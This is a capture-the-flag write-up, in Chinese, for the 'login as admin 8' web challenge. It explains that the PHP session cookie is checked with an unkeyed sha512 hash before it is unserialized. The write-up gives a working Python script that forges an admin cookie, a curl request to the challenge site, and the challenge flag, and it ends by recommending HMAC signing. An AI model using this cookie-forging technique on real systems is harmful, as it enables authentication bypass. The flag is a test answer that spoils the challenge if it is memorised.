# PHM #29 Web — login as admin 8

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 110 |

## 題目

> 連結: [`/login8/`](https://ctf.hackme.quest/login8/)
>
> 這題分成兩個 flag: 本題 (#29) 是 `$flag`, [#30 login8.1](login-as-admin-8.1.md) 是程式碼留言裡的 hidden flag.

## 分析

Login flow:
1. `Session::load()` 從 cookie 讀 `login8cookie` + `login8sha512`
2. 驗 `hash('sha512', $cookie) === $_COOKIE['login8sha512']`
3. 通過 → `unserialize($cookie)` 還原 Session object

```php
public static function load() {
    $data = $_COOKIE['login8cookie'];
    if(hash('sha512', $data) === $_COOKIE['login8sha512']) {   // ← 無 secret
        return unserialize($data);
    } else {
        return new Session();
    }
}
```

**沒有 secret**! 只是 `sha512(cookie)` 當簽章 → 任何人都能算.

直接登入 `guest/guest` 拿到合法 cookie, 改 object 的 `is_admin = true`, 重算 sha512, 送回去即可. Object 結構:

```
O:7:"Session":6:{
    s:14:"\x00Session\x00debug";b:0;       // private
    s:19:"\x00Session\x00debug_dump";s:9:"index.php";
    s:13:"\x00Session\x00data";a:2:{s:8:"password";s:5:"guest";s:5:"admin";b:0;}
    s:4:"user";s:5:"guest";                 // public
    s:4:"pass";s:5:"guest";
    s:8:"is_admin";b:0;                     // ← 改 b:1
}
```

## 解法

```python
import hashlib, urllib.parse
cookie = ('O:7:"Session":6:{s:14:"\x00Session\x00debug";b:1;'
          's:19:"\x00Session\x00debug_dump";s:11:"session.php";'
          's:13:"\x00Session\x00data";a:2:{s:8:"password";s:5:"guest";s:5:"admin";b:1;}'
          's:4:"user";s:5:"guest";s:4:"pass";s:5:"guest";s:8:"is_admin";b:1;}')
sig = hashlib.sha512(cookie.encode('latin-1')).hexdigest()
encoded = urllib.parse.quote(cookie, safe='')
print(f'login8cookie={encoded}; login8sha512={sig}')
```

```bash
curl 'https://ctf.hackme.quest/login8/' \
  -H "Cookie: login8sha512=<sig>; login8cookie=<encoded>"
# → Hello, admin! Here is your flag: FLAG{...}
```

## Flag

```
FLAG{object injection G____G}
```

## 感想

Cookie signing 教科書反例:
- 用 `hash('sha512', $data)` 當簽章 → **沒 secret 等於沒簽**
- 應該用 `hash_hmac('sha512', $data, $secret)`, 或直接用 `signed cookie` 套件

這題 flag 名「object injection G____G」是梗: 作者**原本想**考 unserialize object injection, 但簽章設計壞了, 直接繞過就贏, 根本不需要 craft gadget chain.

後續 [#30 login8.1](login-as-admin-8.1.md) 利用同樣的 cookie 偽造, 翻到 `debug_dump` 讀 config.php, 拿到註解裡的隱藏 flag.
